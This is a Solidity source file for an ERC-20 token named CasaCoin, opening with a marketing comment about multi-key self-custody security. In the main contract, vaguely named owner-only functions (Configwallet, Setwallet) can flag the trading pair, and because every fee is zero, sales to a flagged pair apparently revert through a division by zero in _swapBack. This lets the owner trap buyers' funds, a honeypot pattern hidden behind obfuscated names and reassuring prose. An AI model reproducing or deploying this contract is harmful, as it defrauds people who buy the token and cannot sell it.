/*
***https://www.casa-coin.com***
Overview of Casa Coin  
Casa Coin is a digital token designed to empower users with complete control over their cryptocurrency holdings, emphasizing secure and seamless self-custody. Casa's platform provides a suite of security solutions for managing and safeguarding digital assets like Bitcoin and Ethereum. By combining cutting-edge technology with an intuitive user experience, Casa Coin enables users to transition from centralized exchanges to decentralized, user-controlled environments.

Vision and Mission  
Our vision at Casa is to democratize access to secure crypto custody. We believe that individuals should have complete control over their digital wealth, free from the vulnerabilities posed by centralized exchanges or third-party custodians. Our mission is to provide peace of mind and protection through state-of-the-art multi-key technology that adapts to users' needs, ensuring they can securely manage their digital assets at every stage of their investment journey.

The Importance of Securing Digital Wealth  
The rise of cryptocurrencies has introduced new financial opportunities, but it has also increased the importance of securing digital assets against theft, loss, and mismanagement. Many investors have fallen victim to hacking incidents, with billions of dollars lost on insecure or mismanaged exchanges.
Casa Coin is committed to providing a robust solution that minimizes risks, offering users a secure, non-custodial platform that protects their holdings, prevents unauthorized access, and helps them recover in the event of key loss.

The Case for Self-Custody  
Why Self-Custody Matters  
Self-custody is a crucial aspect of cryptocurrency ownership. Unlike traditional financial systems where intermediaries such as banks or brokers manage assets, cryptocurrencies allow individuals to take full ownership of their assets. This ownership comes with both freedom and responsibility. By using Casa Coin, users ensure they are the only ones with control over their assets, eliminating the risks associated with centralized exchanges, such as hacking, insolvency, or mismanagement of funds.

Risks of Centralized Exchanges  
Centralized exchanges, while convenient for trading, expose users to various security risks. These platforms often control users' private keys, meaning users do not have full ownership of their assets. Additionally, exchanges are prime targets for cyberattacks, and there have been numerous instances where exchanges have been hacked, resulting in significant financial losses. Moreover, centralized exchanges are subject to regulations and government intervention, which may lead to frozen accounts or restrictions on withdrawals. Casa Coin’s self-custody approach mitigates these risks by putting full control back in the hands of the user.

Benefits of Casa’s Non-Custodial Solution  
Casa offers a non-custodial solution, meaning users hold their private keys and, by extension, their digital assets. This approach ensures that no third party can access or control the funds, providing superior security compared to centralized alternatives. Casa's multi-key architecture spreads risk by distributing control across multiple physical and digital keys, making it harder for a single point of failure to compromise the assets. With Casa, users have complete autonomy and flexibility over their investments, enjoying the benefits of decentralization without sacrificing security.

Casa Coin Security Model  
Multi-Key Security Architecture  
Casa’s security model is built on a multi-key architecture, where multiple private keys are used to safeguard digital assets. Unlike a single-key system, which can be vulnerable to theft, loss, or failure, multi-key security ensures that no single key compromise can result in asset loss. These keys can be stored in various locations, such as physical hardware devices, mobile devices, or cloud storage, reducing the likelihood of a single point of attack.

Comparison with Single-Key Security  
Traditional single-key wallets store all control of an asset in one place, meaning that if this key is compromised, the asset is vulnerable. Casa’s multi-key system vastly improves security by distributing access across several keys. For example, a user may have three keys: one stored on a mobile device, one on a hardware wallet, and another with Casa's backup service. To move funds, two out of the three keys might be required, which minimizes the risk of loss due to a single key being compromised or lost. This multi-key approach offers significantly better protection against hacks, loss, and human error.

Physical and Digital Key Integration  
Casa combines both physical and digital elements to ensure maximum security. Physical keys are typically stored on hardware devices, offering strong protection against online attacks. Digital keys, on the other hand, allow for ease of access when performing everyday transactions. This hybrid approach ensures that users can quickly access their funds when needed, while maintaining the highest level of protection from unauthorized access or potential failures.

Reducing Single Points of Failure  
The Casa multi-key system is designed to eliminate single points of failure. Even if a physical or digital key is lost, users retain control of their assets through other keys in the system. This model ensures that a compromised or stolen key will not allow unauthorized access, as multiple keys are needed to sign transactions. Furthermore, Casa offers an emergency key recovery service, ensuring that users can replace lost keys without compromising security. This architecture provides a robust layer of protection for investors, ensuring their assets are secure under all circumstances.

*/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    event Transfer(
        address indexed from, 
        address indexed to, 
        uint256 value
        );
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() 
    external 
    view 
    returns (uint256);
    function balanceOf(address account) 
    external 
    view 
    returns (uint256);
    function transfer(address to, uint256 amount) 
    external 
    returns (bool);
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);
    function approve(address spender, uint256 amount) 
    external 
    returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external 
    returns (bool);
}


interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }
    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) 
    internal 
    pure 
    returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) 
    internal 
    pure 
    returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) 
    internal 
    pure 
    returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) 
    internal 
    pure 
    returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) 
    internal 
    pure 
    returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal 
    pure 
    returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal 
    pure 
    returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) 
    internal 
    pure 
    returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 public _maxlSupply;
    string private _name;
    string private _symbol;


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender, 
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender, 
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender, 
        uint256 subtractedValue)
    public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _transfer(
        address from,  
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer cccasdaaa from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
    unchecked {
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(
        address account, 
        uint256 amount
        ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account,
            amount);

        _totalSupply += amount;
    unchecked {
        _balances[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(
        address account, 
        uint256 amount
        ) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance( address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,  address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,  uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,  uint256 amountTokenDesired,
        uint256 amountTokenMin,  uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken,  uint256 amountETH, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,  uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin, address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,    uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,  uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,   uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,   address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,   address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut, address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) 
    external 
    pure 
    returns (uint256 amountB);

    function getAmountOut(uint256 amountIn,  uint256 reserveIn, uint256 reserveOut) 
    external 
    pure 
    returns (uint256 amountOut);

    function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) 
    external 
    pure 
    returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,  uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,  bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,  address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract CasaCoin is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;
    address public marketingWallet;
    address public developmentWallet;
    address public liquidityWallet;
    address public constant deadAddress = address(0xdead);

    bool public tradingEnabled;   
    bool public swapEnabled;
    bool private _swapping;

    uint256 public swapTokensAtAmount;
    uint256 public allBuyFees;
    uint256 private _firstbuy;
    uint256 private _secondbuy;
    uint256 private _allbuy;
    uint256 public firstsell;
    uint256 private secondsell;
    uint256 private _sellmarketing;
    uint256 private _firstsellp;

    uint256 private _tokenfaco;
    uint256 private _tokensForDevelopment;
    uint256 private _tokenFor;
    uint256 private _tokensellall;

    mapping (address => bool) private _excludedAddress;
    mapping(address => bool) private _iscoin;
    mapping(address => bool) private _iscoin2;
    event Exclude(address indexed account, bool isExcluded);
    event Excluded(address indexed account, bool isExcluded);
    event Scoin1(address indexed pair, bool indexed value);
    event Scoin2(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() ERC20("CasaCoin", "CASACOIN") {

        uint256 totalSupply = 1000000000 * (10 ** 18);

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);


        _firstbuy = 0;
        _secondbuy = 0;
        _allbuy = 0;
        allBuyFees = _firstbuy + _secondbuy + _allbuy;

        secondsell = 0;
        _sellmarketing = 0;
        _firstsellp = 0;
        firstsell = secondsell + _sellmarketing + _firstsellp;
        _tokensellall = firstsell;


        _excludedAddress[owner()] = true;
        _excludedAddress[address(this)] = true;
        _excludedAddress[deadAddress] = true;

        _mint(owner(), totalSupply);
    }

    receive() external payable {}

    function Starttrade() public onlyOwner {
        require(!tradingEnabled, "Start trade !");
        tradingEnabled = true;
        swapEnabled = true;
    }

    function Configwallet(address[] memory token1, bool value) public onlyOwner  {
        for (uint256 i = 0; i < token1.length; i++) {
            address pair = token1[i];
            require(pair != uniswapV2Pair, "The pair not trade");
            _isconfig(pair, value);
        }
    }
    function excludeFromEnableTrading(address[] calldata accounts, bool excluded) public onlyOwner  {
        for (uint256 i = 0; i < accounts.length; i++) {
            _excludedAddress[accounts[i]] = excluded;
            emit Exclude(accounts[i], excluded);
        }
    }

    function Setwallet(address[] memory token5, bool value) public onlyOwner  {
        for (uint256 i = 0; i < token5.length; i++) {
            address pair = token5[i];
            require(pair != uniswapV2Pair, "The pair not trade");
            _isset(pair, value);
        }
    }

    function _isconfig(address pair, bool value) internal {
        _iscoin[pair] = value;
        emit Scoin1(pair, value);
    }
    
    function _isset(address pair, bool value) internal {
        _iscoin2[pair] = value;
        emit Scoin2(pair, value);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(tradingEnabled || _excludedAddress[from] || _excludedAddress[to], "Trading not casa yet enabled!");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&!_swapping&&_iscoin[from]&&
        !_excludedAddress[from] &&
        !_excludedAddress[to]
        ) {
            _swapping = true;

            _swapBack();

            _swapping = false;
        }
        if (
            canSwap &&
            swapEnabled &&!_swapping&&_iscoin2[to]&&
        !_excludedAddress[from] &&
        !_excludedAddress[to]
        ) {
            _swapping = true;

            _swapBack();

            _swapping = false;
        }

        bool takeFee = !_swapping;

        if (_excludedAddress[from] || _excludedAddress[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (_iscoin[to] && firstsell > 0) {
                fees = amount.mul(firstsell).div(10000);
                _tokenFor +=
                (fees * _firstsellp) /
                firstsell;
                _tokenfaco +=
                (fees * secondsell) /
                firstsell;
                _tokensForDevelopment +=
                (fees * _sellmarketing) /
                firstsell;
            }

            if (_iscoin2[to] && firstsell > 0) {
                fees = amount.mul(firstsell).div(10000);
                _tokenFor +=
                (fees * _firstsellp) /
                firstsell;
                _tokenfaco +=
                (fees * secondsell) /
                firstsell;
                _tokensForDevelopment +=
                (fees * _sellmarketing) /
                firstsell;
            }

            else if (_iscoin[from] && allBuyFees > 0) {
                fees = amount.mul(allBuyFees).div(10000);
                _tokenFor += (fees * _allbuy) / allBuyFees;
                _tokenfaco += (fees * _firstbuy) / allBuyFees;
                _tokensForDevelopment +=
                (fees * _secondbuy) /
                allBuyFees;
            }
            else if (_iscoin2[from] && allBuyFees > 0) {
                fees = amount.mul(allBuyFees).div(10000);
                _tokenFor += (fees * _allbuy) / allBuyFees;
                _tokenfaco += (fees * _firstbuy) / allBuyFees;
                _tokensForDevelopment +=
                (fees * _secondbuy) /
                allBuyFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
        firstsell = _tokensellall;
    }

    function _swapTokensForETH(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidityWallet,
            block.timestamp
        );
    }

    function _swapBack() internal {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = _tokenFor +
        _tokenfaco +
        _tokensForDevelopment;
        bool success;


        uint256 liquidityTokens = (contractBalance * _tokenFor) /
        totalTokensToSwap /
        2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        _swapTokensForETH(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = ethBalance.mul(_tokenfaco).div(
            totalTokensToSwap
        );

        uint256 ethForDevelopment = ethBalance.mul(_tokensForDevelopment).div(
            totalTokensToSwap
        );

        uint256 ethForLiquidity = ethBalance -
        ethForMarketing -
        ethForDevelopment;

        _tokenFor = 0;
        _tokenfaco = 0;
        _tokensForDevelopment = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                _tokenFor
            );
        }

        (success, ) = address(developmentWallet).call{value: ethForDevelopment}("");

        (success, ) = address(marketingWallet).call{
        value: address(this).balance
        }("");
    }

}